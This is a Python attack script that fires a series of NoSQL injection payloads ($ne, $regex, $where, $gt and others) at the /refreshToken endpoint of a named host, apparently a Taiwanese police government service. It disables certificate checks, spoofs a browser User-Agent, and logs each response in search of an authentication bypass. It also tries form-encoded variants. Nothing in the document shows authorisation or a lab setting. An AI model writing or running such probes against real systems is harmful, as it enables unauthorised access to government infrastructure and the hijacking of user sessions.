import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

print("=== /refreshToken NoSQL 注入深入 ===")
tests=[
  ("ne", {"refreshToken":{"$ne":None}}),
  ("ne-empty", {"refreshToken":{"$ne":""}}),
  ("or", {"refreshToken":{"$or":[{"refreshToken":"a"},{"refreshToken":"b"}]}}),
  ("regex", {"refreshToken":{"$regex":"^"}}),
  ("in", {"refreshToken":{"$in":["a","b"]}}),
  ("str", {"refreshToken":"x"}),
  ("empty", {"refreshToken":""}),
  ("null", {"refreshToken":None}),
  ("gt", {"refreshToken":{"$gt":""}}),
  ("where", {"refreshToken":{"$where":"function(){return true}"}}),
  ("and", {"refreshToken":{"$and":[{"refreshToken":{"$ne":None}},{"username":{"$ne":None}}]}}),
]
for name, body in tests:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
    try:
        r=s.post(BASE+"/refreshToken", json=body, timeout=10)
        print(f"  {name:12s} -> {r.status_code} {r.text[:75]}")
    except Exception as e:
        print(f"  {name:12s} -> ERR {repr(e)[:40]}")
    time.sleep(0.08)

print("\n=== form-urlencoded /refreshToken ===")
for name, data in [("ne",{"refreshToken":"$ne"}),("empty",{"refreshToken":""}),("null",{"refreshToken":None})]:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        r=s.post(BASE+"/refreshToken", data=data, timeout=10)
        print(f"  {name:12s} -> {r.status_code} {r.text[:60]}")
    except Exception as e:
        print(f"  {name:12s} -> ERR {repr(e)[:40]}")
print("DONE")
